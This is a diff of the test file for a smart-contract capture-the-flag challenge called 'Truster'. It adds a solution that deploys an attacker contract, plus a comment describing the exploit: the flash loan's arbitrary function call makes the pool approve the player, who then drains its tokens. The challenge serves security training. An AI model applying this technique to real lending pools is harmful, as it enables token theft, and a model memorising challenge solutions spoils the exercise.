@@ -23,6 +23,10 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // In our contract we call flashLoan and using the data in functionCall 
+        // we make the pool call the token to approve us as spender of the tokens and the transfer the tokens our address
+        let requester = await (await (await ethers.getContractFactory('TrusterRequester')).deploy()).connect(player);
+        await requester.getTokens(pool.address);
     });
 
     after(async function () {
